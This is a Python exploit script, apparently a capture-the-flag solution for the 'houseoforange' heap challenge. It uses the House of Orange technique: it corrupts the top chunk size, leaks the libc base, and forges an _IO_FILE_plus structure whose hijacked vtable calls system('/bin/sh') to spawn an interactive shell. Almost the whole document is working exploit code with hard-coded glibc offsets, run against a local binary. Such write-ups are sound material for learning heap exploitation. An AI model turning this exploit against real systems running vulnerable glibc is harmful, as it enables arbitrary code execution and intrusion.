from pwn_debug import *

context.arch = "amd64"  # used by IO_FILE_plus module

def build(length, name, price, color):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Length of name :", str(length))
    p.sendafter("Name :", name)
    p.sendlineafter("Price of Orange:", str(price))
    p.sendlineafter("Color of Orange:", str(color))

def leak():
    p.sendlineafter("Your choice :", "2")
    p.recvuntil(cyclic(0x8))
    return u64(p.recv(6).ljust(8, "\x00")) - 0x3c3b78

def upgrade(length, name, price, color):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Length of name :", str(length))
    p.sendafter("Name:", name)
    p.sendlineafter("Price of Orange: ", str(price))
    p.sendlineafter("Color of Orange:", str(color))

def pwn(p):
    build(0x18, cyclic(0x18), 8848, 0xddaa)
    
    # overwrite `size` of top chunk
    upgrade(0x40, cyclic(0x38) + p64(0xfa1), 8848, 0xddaa)  # fake `size`: 0xfa1

    # let sysmalloc() free the old top chunk into unsorted bin
    build(0x1000, cyclic(0x1000), 8848, 0xddaa)

    # ...so that we can leak from it
    build(0x8, cyclic(0x8), 8848, 0xddaa)
    libc = leak()
    success("libc base: " + hex(libc))

    _IO_list_all  = libc + 0x3c4520
    _IO_str_jumps = libc + 0x3c27a0
    str_bin_sh    = libc + 0x18c58b
    system        = libc + 0x45380

    orange = IO_FILE_plus()
    # 0x08: ((malloc_chunk) orange).size
    orange._IO_read_ptr = 0x60                
    # 0x18: ((malloc_chunk) orange).bk  
    orange._IO_read_base = _IO_list_all - 0x10
    
    # hijack _IO_OVERFLOW():
    orange.vtable = _IO_str_jumps - 0x8 
    # abuse _IO_str_finish():
    orange._IO_buf_base = str_bin_sh

    # other restrictions for things to work...
    orange._flags = 0xfbad8080
    orange._IO_write_ptr = 0xdeadbeef
    assert(orange._flags & 0x8000 != 0)
    assert((orange._IO_buf_base) and (orange._flags & 0x1 == 0))
    assert((orange._mode <= 0) and (orange._IO_write_ptr > orange._IO_write_base))

    # pack up
    payload  = cyclic(0x30)
    payload += str(orange)
    payload += cyclic(8)

    # 0xe8: ((_IO_strfile) orange)._s._free_buffer
    payload += p64(system)

    upgrade(len(payload), payload, 8848, 0xddaa)

    # PWN!
    p.sendline("1")
    p.interactive()

if __name__ == "__main__":
    p = process("./houseoforange")
    pwn(p)